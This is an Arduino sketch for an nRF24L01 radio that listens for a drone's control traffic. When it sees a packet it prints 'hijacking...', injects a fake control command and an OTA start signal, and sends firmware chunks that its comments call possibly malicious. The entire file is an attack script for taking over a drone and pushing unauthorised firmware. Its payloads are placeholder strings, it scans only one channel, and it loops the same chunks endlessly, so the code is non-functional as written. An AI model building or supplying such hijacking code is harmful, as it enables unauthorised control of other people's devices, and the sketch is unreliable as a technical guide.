#include <SPI.h>
#include <Wire.h>
#include <nRF24L01.h>
#include <RF24.h>

RF24 radio(9, 10);  // CE, CSN pins for nRF24L01
byte addresses[][6] = {"1Ctrl", "2Ctrl"};  // Possible addresses for control communication

bool isControlChannelDetected = false;  // Flag to check if the channel is found

void setup() {
  Serial.begin(9600);
  radio.begin();
  radio.setPALevel(RF24_PA_HIGH);
  radio.setChannel(0);  // Start by scanning channel 0
  radio.openReadingPipe(1, addresses[0]); // Listen for communication
  radio.startListening();
}

void loop() {
  if (radio.available()) {
    char receivedData[32] = "";
    radio.read(&receivedData, sizeof(receivedData));

    // Check if we have intercepted control communication
    if (receivedData[0] == 'C') {
      Serial.println("Control channel detected, hijacking...");
      isControlChannelDetected = true;
      interceptAndStartOTA();
    }
  }

  if (isControlChannelDetected) {
    // Proceed with OTA update by sending the firmware update signal
    sendOTAUpdateSignal();
    sendFirmwareChunks();
  }
}

void interceptAndStartOTA() {
  // Send a fake control command to start OTA update (simulating hack)
  char fakeControlSignal[] = "UUpdateStart";  // Start firmware update
  radio.write(&fakeControlSignal, sizeof(fakeControlSignal));
  delay(100);  // Wait for drone to acknowledge OTA update
  Serial.println("Interception successful, OTA update started.");
}

void sendOTAUpdateSignal() {
  // Simulate sending a signal to tell the drone to enter update mode
  char otaStartSignal[] = "UStartOTA";  // OTA update start command
  radio.write(&otaStartSignal, sizeof(otaStartSignal));
  delay(500);  // Wait for the drone to acknowledge entering update mode
}

void sendFirmwareChunks() {
  // Simulate sending firmware in chunks (malicious or legitimate)
  char firmwareData[] = "FirmwareChunk1";  // First chunk of firmware
  radio.write(&firmwareData, sizeof(firmwareData));
  delay(1000);  // Simulate sending next chunk
  
  // Continue sending more chunks of firmware
  char nextChunk[] = "FirmwareChunk2";  // Second chunk of firmware
  radio.write(&nextChunk, sizeof(nextChunk));
  delay(1000);
}
